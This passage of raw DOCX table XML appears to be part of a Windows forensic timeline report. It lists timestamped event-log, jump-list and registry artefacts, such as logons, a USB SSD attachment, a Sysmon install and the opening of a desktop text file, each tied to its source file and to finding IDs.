              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 1100 | Microsoft-Windows-Eventlog | The event logging service has shut down</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#26729</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:05.178200</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump List: entry created (≈ first opened)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>Notepad 64-bit interactions=1 machine=desktop-kj81a5a</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261019151058_AutomaticDestinations.csv#7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\users\medmondson\Appdata\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\9b9cdc69c1c24e2b.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:05.178200</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump List: entry created (≈ first opened)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>Quick Access interactions=1 machine=desktop-kj81a5a</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261019151058_AutomaticDestinations.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\users\medmondson\Appdata\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\5f7b5f1e01b83767.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:09.344932</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\Terminal Server</w:t>
              <w:br/>
              <w:t>Threat Hunting | RDP Connections Status | fDenyTSConnections=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#7137</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:10.277482</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DESKTOP-KJ81A5A\medmondson | LogonType 2 | LogonId: 0x15347 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-KJ81A5A (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#26783</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-011, F-012, I-011, T-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:10.277511</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DESKTOP-KJ81A5A\medmondson | LogonType 2 | LogonId: 0x153A9 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-KJ81A5A (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#26784</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-011, T-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:10.376162</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ProductName=Windows 10 Pro</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#25</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:10.376162</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InstallDate=2023-11-09 11:02:48.0000000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:10.376162</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CurrentBuild=18362</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#31</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:23.563477</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DESKTOP-KJ81A5A\medmondson | LogonType 2 | LogonId: 0x57147 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-KJ81A5A (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#26863</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:45:39.658338</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: SCSI</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Disk: installed ; Disk: first installed</w:t>
              <w:br/>
              <w:t xml:space="preserve">Ven_Samsung Prod_PSSD_T7 serial=000000 Samsung PSSD T7 SCSI Disk Device </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_SCSI.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:45:49.033342</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: VolumeInfoCache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volume seen (VolumeInfoCache)</w:t>
              <w:br/>
              <w:t>DriveName=E: | VolumeLabel=SSD | DriveType=Fixed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_VolumeInfoCache.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:51:10.748733</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\Sysmon64.exe</w:t>
              <w:br/>
              <w:t>System 7045 | Service Control Manager | A new service was installed in the system | Name: Sysmon64 | StartType: auto start | Account: LocalSystem | C:\Windows\Sysmon64.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27966</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:51:10.762839</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\Tools\sysmon-config.xml</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 16 | Microsoft-Windows-Sysmon | ServiceConfigurationChange | ConfigurationFileHash: SHA256=E771CA7BD01FDB1BA7014BEB86D74AC9B30D7080AE79B1B8D55419E46C525D24 | C:\Users\medmondson\Desktop\Tools\sysmon-config.xml</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18346</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001, F-002, T-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:51:11.004937</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-WMI-Activity/Operational 5861 | Microsoft-Windows-WMI-Activity | WMI Registration of Permanent Event Consumer | Ess: SCM Event Log Filter | Binding EventFilter: , instance of __EventFilter, {, CreatorSID = {1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0};, EventNamespace = "root\\cimv2";, Name = "SCM Event Log Filter";, Query = "select * from MSFT_SCMEventLogEvent";, QueryLangu</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#24734</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-WMI-Activity%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:51:11.035506</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 4 | Microsoft-Windows-Sysmon | Sysmon service state changed | Sysmon Version 15.1 | Status: Started | Timestamp: 2023-11-10 10:51:11.027</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18347</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001, F-002, T-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:52:42.826084</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
